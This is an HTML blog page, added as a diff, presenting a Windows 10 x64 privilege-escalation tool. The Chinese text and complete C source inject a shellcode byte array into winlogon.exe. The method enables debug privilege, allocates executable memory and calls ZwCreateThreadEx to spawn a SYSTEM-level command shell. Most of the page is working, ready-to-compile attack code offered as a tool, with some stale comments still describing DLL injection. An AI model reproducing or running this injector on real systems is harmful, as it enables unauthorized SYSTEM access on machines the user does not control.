@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>win10_x64下shellcode提权工具(SYSTEM权限)</title>
+        <meta charset="utf-8">
+        <link rel="stylesheet" href="../css/index.css"/>
+        <style>
+            .page_head
+            {
+                height: auto;
+                width: 100%;
+                font-size: 20px;
+            }
+            .page_body
+            {
+                height: auto;
+                width: 93%;
+                border: solid 1px;
+                border-color: rgb(0 ,255, 0);
+                margin: auto;
+            }
+            a
+            {
+                color: rgb(0 ,255, 0);
+            }
+            .txt
+            {
+                width: 100%;
+                height: 100%;
+                text-align: left;
+                font-size: 20px;
+            }
+
+            img
+            {
+                width: 90%;
+                height: auto;
+            }
+
+            pre
+            {
+                width: 90%;
+                height: auto;
+                background-color: rgb(0, 0, 0);
+                color: rgb(0 ,255, 0);
+                text-align: left;
+                border: solid 1px;
+                border-color: rgb(0 ,255, 0);
+                padding-left: 5px;
+                font-size: 20px;
+                margin: auto;
+                overflow: auto;
+            }
+
+            ol
+            {
+                font-size: 20px;
+                text-align: left;
+            }
+        </style>
+        <link rel="shortcut icon" href="../image/f.ico"/>
+        <script type="text/javascript" src="../script/fun.js"></script>
+    </head>
+
+    <body>
+        <canvas id="content"></canvas>
+        <script type="text/javascript" src="../script/bytes.js"></script>
+        <div class="background_0">
+            <div class="background_center">
+                <!--文章头-->
+                <div class="page_head">
+                    <!--文章标头-->
+                    <h1 style="font-size: 35pt;">win10_x64下shellcode提权工具(SYSTEM权限)</h1>
+                    <!--其他信息部分-->
+                    <table style="width: 100%;">
+                        <tr>
+                            <td><label>时间：</label><span>2020/12/11</span></td>
+                            <td><label id="clock"></label></td>
+                            <td><label>作者：</label><span><a href="../index.html">Pluviophile</a></span></td>
+                        </tr>
+                    </table>
+                </div>
+                <!--文章内容-->
+                <div class="page_body">
+                    <p class="txt">
+                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上一次是通过远线程注入，将指定的dll模块加载进我们指定的进程，这一次将我们写好的shellcode
+                        注入进指定的进程，从而执行任意代码。首先我们要清楚如何获取一个具有system权限的cmd，想要获取一个具有system权限的cmd，首先这个cmd得是一个
+                        具有system权限进程的子进程，windows下具有system权限的进程有：winlogon.exe、wininit.exe等，这次我们就通过对winlogon.exe进行远线程注入shellcode
+                        拿到一个system权限的cmd。
+                    </p>
+                    <h1>shellcode</h1>
+                    <p class="txt">
+                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先明确shellcode是有一段汇编代码编写而成，然后转为机器码存在内存中然后直接从内存中去
+                        执行的数据，关于shellcode的代码编写此处不做详细介绍可以去看之前的那一篇，我们直接从用编译好的exe提取机器码的部分开始。
+                        很多人对提取机器码都感到头疼，都觉得那是一项体力活，其实只要掌握善用动态调试工具就可以轻松的搞到机器码。
+                        首先打开x64dbg，将我们刚刚用nasm编译好的程序拖入x64dbg
+                    </p>
+                    <img src="https://img-blog.csdnimg.cn/20201122113215238.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzgxNTkzMA==,size_16,color_FFFFFF,t_70#pic_center" />
+                    <p class="txt">
+                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以看到这并不是我们要的汇编代码，这些代码是由编译器生成用于将我们的程序
+                        正确被进程加载器加载的一段代码，想要找到我们的汇编代码，可以直接选中符号，然后选中我们编译好的进程，就能看到我们要找的代码了
+                    </p>
+                    <img src="https://img-blog.csdnimg.cn/20201122113535983.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzgxNTkzMA==,size_16,color_FFFFFF,t_70#pic_center"/>
+                    <img src="https://img-blog.csdnimg.cn/20201122113608549.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzgxNTkzMA==,size_16,color_FFFFFF,t_70#pic_center"/>
+                    <p class="txt">
+                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这就是我们想要的代码也就是在上一篇文章中写好的汇编程序，现在我们来提取机
+                        器码，首先将我们写好要注入的代码全部选中，然后右击选“二进制->复制”，就可以得到我们需要的机器码
+                    </p>
+                    <img src="https://img-blog.csdnimg.cn/20201122121817882.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzgxNTkzMA==,size_16,color_FFFFFF,t_70#pic_center"/>
+                    <h1>注入程序</h1>
+                    <p class="txt">
+                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后来写C语言部分，这部分其实就是一个远线程注入程序。
+                        首先将刚刚拿到的机器码拷入我们的程序源代码，因为我们需要的是十六进制数组的形式，可以利用记事本自带的替换功能，
+                        吧所有的空格替换为“,0x”即可，然后直接粘贴进程序
+                    </p>
+                    <pre>
+//shellcode机器码
+unsigned char shellcode[] = 
+{
+    0x50,0x51,0x52,0x53,0x56,0x57,0x55,0x48,0x83,0xEC,0x28,0x4D,0x31,0xC0,0x48,0x31,0xC9,0x4D,0x31,0xD2,0x49,0x83,
+    0xC2,0x60,0x65,0x49,0x8B,0x02,0x48,0x8B,0x40,0x18,0x48,0x8B,0x70,0x20,0x48,0xAD,0x48,0x96,0x48,0xAD,0x48,0x8B,
+    0x58,0x20,0x4D,0x31,0xC0,0x44,0x8B,0x43,0x3C,0x48,0x31,0xD2,0x4C,0x89,0xC2,0x48,0x01,0xDA,0x48,0xC7,0xC0,0xFF,
+    0xFF,0xFF,0xFF,0x48,0x2D,0x77,0xFF,0xFF,0xFF,0x44,0x8B,0x04,0x02,0x49,0x01,0xD8,0x48,0x31,0xF6,0x41,0x8B,0x70,
+    0x20,0x48,0x01,0xDE,0x48,0x31,0xC9,0x41,0xB9,0x57,0x69,0x6E,0x45,0x48,0xFF,0xC1,0x48,0x31,0xC0,0x8B,0x04,0x8E,
+    0x48,0x01,0xD8,0x44,0x39,0x08,0x75,0xEF,0x48,0x31,0xF6,0x41,0x8B,0x70,0x24,0x48,0x01,0xDE,0x66,0x8B,0x0C,0x4E,
+    0x48,0x31,0xF6,0x41,0x8B,0x70,0x1C,0x48,0x01,0xDE,0x48,0x31,0xD2,0x8B,0x14,0x8E,0x48,0x01,0xDA,0x48,0x89,0xD7,
+    0x48,0xC7,0xC0,0xFF,0xFF,0xFF,0xFF,0x48,0x2D,0x9C,0x92,0x9B,0xFF,0x50,0x48,0x89,0xE1,0x48,0x31,0xD2,0x48,0x83,
+    0xC2,0x05,0xFF,0xD7,0x48,0x83,0xC4,0x30,0x5D,0x5F,0x5E,0x5B,0x5A,0x59,0x58,0xC3
+};
+                    </pre>
+                    <p class="txt">
+                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后开始编写注入程序，首先要对我们的进程本身获得调试权限
+                    </p>
+                    <pre>
+ /*
+设定本进程的程序调试权限
+lPcstr:权限字符串
+backCode:错误返回码
+*/
+BOOL GetDebugPrivilege(
+_In_ LPCSTR lPcstr,
+_Inout_ DWORD* backCode
+)
+{
+	HANDLE Token = NULL;
+	LUID luid = { 0 };
+	TOKEN_PRIVILEGES Token_privileges = { 0 };
+	//内存初始化为zero
+	memset(&luid, 0x00, sizeof(luid));
+	memset(&Token_privileges, 0x00, sizeof(Token_privileges));
+
+	//打开进程令牌
+	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &Token))
+	{
+		*backCode = 0x01;
+		return FALSE;
+	}
+
+	//获取特权luid
+	if (!LookupPrivilegeValue(NULL,lPcstr,&luid))
+	{
+		*backCode = 0x02;
+		return FALSE;
+	}
+
+	//设定结构体luid与特权
+	Token_privileges.PrivilegeCount = 1;
+	Token_privileges.Privileges[0].Luid = luid;
+	Token_privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+	//修改进程特权
+	if (!AdjustTokenPrivileges(Token, FALSE, &Token_privileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
+	{
+		*backCode = 0x03;
+		return FALSE;
+	}
+	*backCode = 0x00;
+	return TRUE;
+}
+                    </pre>
+                    <p class="txt">
+                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后我们还需要一个函数用来获取进程快照，然后遍历获取找到我们指定的进程并获取其pid
+                    </p>
+                    <pre>
+int GetProcessPid(
+	_In_ const char* ProcessName,
+	_Inout_ DWORD* backCode
+)
+{
+	PROCESSENTRY32 P32 = { 0 };
+	HANDLE H32 = NULL;
+	//内存初始化为zeor
+	memset(&P32, 0X00, sizeof(P32));
+	//创建快照
+	H32 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	P32.dwSize = sizeof(P32);
+	if (H32 == NULL)
+	{
+		*backCode = 0x01;
+		return -1;
+	}
+	//开始循环遍历进程
+	BOOL ret = Process32First(H32, &P32);
+	while (ret)
+	{
+		//发现指定进程存在
+		if (!strcmp(P32.szExeFile, ProcessName))
+		{
+			*backCode = 0x00;
+			return P32.th32ProcessID;
+		}
+		ret = Process32Next(H32, &P32);
+	}
+	*backCode = 0x01;
+	return -1;
+}
+                    </pre>
+                    <p class="txt">
+                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下面开始编写主程序，
+                    </p>
+                    <ol type="1">
+                        <li>首先自然是调用上面第一个函数获取调试权限（这一步省略好像也没关系，在我的机器上是这样）。</li>
+                        <li>然后调用第二个函数获取winlogon.exe的进程id。</li>
+                        <li>根据pid打开进程</li>
+                        <li>使用VirtualAllocEx函数在我们打开的进程中申请内存</li>
+                        <li>使用WriteProcessMemory函数将我们的shellcode写进刚刚申请得到的虚拟内存中</li>
+                        <li>通过加载ntdll.dll动态库获取到内核函数ZwCreateThreadEx并使用</li>
+                        <li>调用ZwCreateThreadEx函数创建远线程，执行我们的shellcode</li>
+                         <li> 一些善后处理，该释放的释放该退出的退出</li>
+                    </ol>
+                    <pre>
+/*
+主函数
+*/
+int main(int argv, char* argc[])
+{
+	//对必要的变量进行声明以及初始化
+	DWORD backCode = 0;
+	HANDLE hProcess = NULL;
+	LPVOID Buff = NULL;
+	HMODULE Ntdll = NULL;
+	SIZE_T write_len = 0;
+	DWORD dwStatus = 0;
+	HANDLE hRemoteThread = NULL;
+
+	//通过进程名获取pid
+	int pid = GetProcessPid("winlogon.exe", &backCode);
+	if (pid == -1)
+	{
+		puts("pid get error");
+		return 0;
+	}
+
+	//提升进程特权，获得调试权限
+	if (!GetDebugPrivilege(SE_DEBUG_NAME, &backCode))
+	{
+		puts("DBG privilege error");
+		printf(" %d", backCode);
+		return 0;
+	}
+
+	//打开要被注入的进程
+	if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)) == NULL)
+	{
+		puts("process open erro");
+		return 0;
+	}
+
+	//在要被注入的进程中创建内存，用于存放注入dll的路径
+	Buff = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	if (Buff == NULL)
+	{
+		puts("Buff alloc error");
+		return 0;
+	}
+
+	//将dll路径写入刚刚创建的内存中
+	WriteProcessMemory(hProcess, Buff, shellcode, sizeof(shellcode), &write_len);
+	if (sizeof(shellcode) != write_len)
+	{
+		puts("write error");
+		return 0;
+	}
+
+	//加载ntdll.dll并从中获取内核函数ZwCreateThread，并使用函数指针指向此函数
+	Ntdll = LoadLibrary("ntdll.dll");
+	pZwCreateThreadEx ZwCreateThreadEx =
+		(pZwCreateThreadEx)GetProcAddress(Ntdll, "ZwCreateThreadEx");
+	if (ZwCreateThreadEx == NULL)
+	{
+		puts("func get error");
+		return 0;
+	}
+
+	//执行ZwCreateThread函数，在指定进程中创建线程加载要被注入的dll
+	dwStatus = ZwCreateThreadEx(
+		&hRemoteThread,
+		PROCESS_ALL_ACCESS,
+		NULL,
+		hProcess,
+		(LPTHREAD_START_ROUTINE)Buff,
+		NULL,
+		0, 0, 0, 0,
+		NULL
+	);
+	if (hRemoteThread == NULL)
+	{
+		puts("zwcreatethread fun error");
+		return 0;
+	}
+
+	//释放不需要的变量以及内存
+	CloseHandle(hProcess);
+	FreeModule(Ntdll);
+	ExitProcess(0);
+	return 0;
+}
+
+                    </pre>
+                    <p class="txt">
+                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;完整代码如下
+                    </p>
+                    <pre>
+/************************************************************
+*                     Author:Pluviophile                                                                        *
+*                    Date:2020/9/27-23:03                                                                    *
+*     E-Mail:1565203609@qq.com/pluviophile12138@outlook.com               *
+*         远线程注入，将shellcode指定注入指定的进程执行                               *
+*************************************************************/
+
+#pragma once
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;Windows.h&gt;
+#include &lt;TlHelp32.h&gt;
+
+//shellcode机器码
+unsigned char shellcode[] = 
+{
+	0x50,0x51,0x52,0x53,0x56,0x57,0x55,0x48,0x83,0xEC,0x28,0x4D,0x31,0xC0,0x48,0x31,0xC9,0x4D,0x31,0xD2,0x49,0x83,
+	0xC2,0x60,0x65,0x49,0x8B,0x02,0x48,0x8B,0x40,0x18,0x48,0x8B,0x70,0x20,0x48,0xAD,0x48,0x96,0x48,0xAD,0x48,0x8B,
+	0x58,0x20,0x4D,0x31,0xC0,0x44,0x8B,0x43,0x3C,0x48,0x31,0xD2,0x4C,0x89,0xC2,0x48,0x01,0xDA,0x48,0xC7,0xC0,0xFF,
+	0xFF,0xFF,0xFF,0x48,0x2D,0x77,0xFF,0xFF,0xFF,0x44,0x8B,0x04,0x02,0x49,0x01,0xD8,0x48,0x31,0xF6,0x41,0x8B,0x70,
+	0x20,0x48,0x01,0xDE,0x48,0x31,0xC9,0x41,0xB9,0x57,0x69,0x6E,0x45,0x48,0xFF,0xC1,0x48,0x31,0xC0,0x8B,0x04,0x8E,
+	0x48,0x01,0xD8,0x44,0x39,0x08,0x75,0xEF,0x48,0x31,0xF6,0x41,0x8B,0x70,0x24,0x48,0x01,0xDE,0x66,0x8B,0x0C,0x4E,
+	0x48,0x31,0xF6,0x41,0x8B,0x70,0x1C,0x48,0x01,0xDE,0x48,0x31,0xD2,0x8B,0x14,0x8E,0x48,0x01,0xDA,0x48,0x89,0xD7,
+	0x48,0xC7,0xC0,0xFF,0xFF,0xFF,0xFF,0x48,0x2D,0x9C,0x92,0x9B,0xFF,0x50,0x48,0x89,0xE1,0x48,0x31,0xD2,0x48,0x83,
+	0xC2,0x05,0xFF,0xD7,0x48,0x83,0xC4,0x30,0x5D,0x5F,0x5E,0x5B,0x5A,0x59,0x58,0xC3
+};
+
+
+/*判断系统架构，并定义ZwCreateThreadEx函数指针*/
+#ifdef _WIN64
+typedef	DWORD(WINAPI* pZwCreateThreadEx)(
+	PHANDLE ThreadHandle,
+	ACCESS_MASK DesiredAccess,
+	LPVOID ObjectAttributes,
+	HANDLE ProcessHandle,
+	LPTHREAD_START_ROUTINE lpStartAddress,
+	LPVOID lpParameter,
+	ULONG CreateThreadFlags,
+	SIZE_T ZeroBits,
+	SIZE_T StackSize,
+	SIZE_T MaximumStackSize,
+	LPVOID pUnkown
+	);
+#else
+typedef DWORD(WINAPI* pZwCreateThreadEx)(
+	PHANDLE ThreadHandle,
+	ACCESS_MASK DesiredAccess,
+	LPVOID ObjectAttributes,
+	HANDLE ProcessHandle,
+	LPTHREAD_START_ROUTINE lpStartAddress,
+	LPVOID lpParameter,
+	BOOL CreateSuspended,
+	DWORD dwStackSize,
+	DWORD dw1,
+	DWORD dw2,
+	LPVOID pUnkown
+	);
+#endif
+
+/*
+设定本进程的程序调试权限
+lPcstr:权限字符串
+backCode:错误返回码
+*/
+BOOL GetDebugPrivilege(
+_In_ LPCSTR lPcstr,
+_Inout_ DWORD* backCode
+)
+{
+	HANDLE Token = NULL;
+	LUID luid = { 0 };
+	TOKEN_PRIVILEGES Token_privileges = { 0 };
+	//内存初始化为zero
+	memset(&luid, 0x00, sizeof(luid));
+	memset(&Token_privileges, 0x00, sizeof(Token_privileges));
+
+	//打开进程令牌
+	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &Token))
+	{
+		*backCode = 0x01;
+		return FALSE;
+	}
+
+	//获取特权luid
+	if (!LookupPrivilegeValue(NULL,lPcstr,&luid))
+	{
+		*backCode = 0x02;
+		return FALSE;
+	}
+
+	//设定结构体luid与特权
+	Token_privileges.PrivilegeCount = 1;
+	Token_privileges.Privileges[0].Luid = luid;
+	Token_privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+	//修改进程特权
+	if (!AdjustTokenPrivileges(Token, FALSE, &Token_privileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
+	{
+		*backCode = 0x03;
+		return FALSE;
+	}
+	*backCode = 0x00;
+	return TRUE;
+}
+
+/*
+根据进程名获取进程pid，执行无误返回进程pid，出错返回-1
+ProcessName:进程名
+backCode:错误返回码
+*/
+int GetProcessPid(
+	_In_ const char* ProcessName,
+	_Inout_ DWORD* backCode
+)
+{
+	PROCESSENTRY32 P32 = { 0 };
+	HANDLE H32 = NULL;
+	//内存初始化为zeor
+	memset(&P32, 0X00, sizeof(P32));
+	//创建快照
+	H32 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	P32.dwSize = sizeof(P32);
+	if (H32 == NULL)
+	{
+		*backCode = 0x01;
+		return -1;
+	}
+	//开始循环遍历进程
+	BOOL ret = Process32First(H32, &P32);
+	while (ret)
+	{
+		//发现指定进程存在
+		if (!strcmp(P32.szExeFile, ProcessName))
+		{
+			*backCode = 0x00;
+			return P32.th32ProcessID;
+		}
+		ret = Process32Next(H32, &P32);
+	}
+	*backCode = 0x01;
+	return -1;
+}
+
+/*
+主函数
+*/
+int main(int argv, char* argc[])
+{
+	//对必要的变量进行声明以及初始化
+	DWORD backCode = 0;
+	HANDLE hProcess = NULL;
+	LPVOID Buff = NULL;
+	HMODULE Ntdll = NULL;
+	SIZE_T write_len = 0;
+	DWORD dwStatus = 0;
+	HANDLE hRemoteThread = NULL;
+
+	//通过进程名获取pid
+	int pid = GetProcessPid("winlogon.exe", &backCode);
+	if (pid == -1)
+	{
+		puts("pid get error");
+		return 0;
+	}
+
+	//提升进程特权，获得调试权限
+	if (!GetDebugPrivilege(SE_DEBUG_NAME, &backCode))
+	{
+		puts("DBG privilege error");
+		printf(" %d", backCode);
+		return 0;
+	}
+
+	//打开要被注入的进程
+	if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)) == NULL)
+	{
+		puts("process open erro");
+		return 0;
+	}
+
+	//在要被注入的进程中创建内存，用于存放注入dll的路径
+	Buff = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	if (Buff == NULL)
+	{
+		puts("Buff alloc error");
+		return 0;
+	}
+
+	//将dll路径写入刚刚创建的内存中
+	WriteProcessMemory(hProcess, Buff, shellcode, sizeof(shellcode), &write_len);
+	if (sizeof(shellcode) != write_len)
+	{
+		puts("write error");
+		return 0;
+	}
+
+	//加载ntdll.dll并从中获取内核函数ZwCreateThread，并使用函数指针指向此函数
+	Ntdll = LoadLibrary("ntdll.dll");
+	pZwCreateThreadEx ZwCreateThreadEx =
+		(pZwCreateThreadEx)GetProcAddress(Ntdll, "ZwCreateThreadEx");
+	if (ZwCreateThreadEx == NULL)
+	{
+		puts("func get error");
+		return 0;
+	}
+
+	//执行ZwCreateThread函数，在指定进程中创建线程加载要被注入的dll
+	dwStatus = ZwCreateThreadEx(
+		&hRemoteThread,
+		PROCESS_ALL_ACCESS,
+		NULL,
+		hProcess,
+		(LPTHREAD_START_ROUTINE)Buff,
+		NULL,
+		0, 0, 0, 0,
+		NULL
+	);
+	if (hRemoteThread == NULL)
+	{
+		puts("zwcreatethread fun error");
+		return 0;
+	}
+
+	//释放不需要的变量以及内存
+	CloseHandle(hProcess);
+	FreeModule(Ntdll);
+	ExitProcess(0);
+	return 0;
+}
+                    </pre>
+                </div>
+                <br><br><br>
+            </div>
+        </div>
+    </body>
+</html>
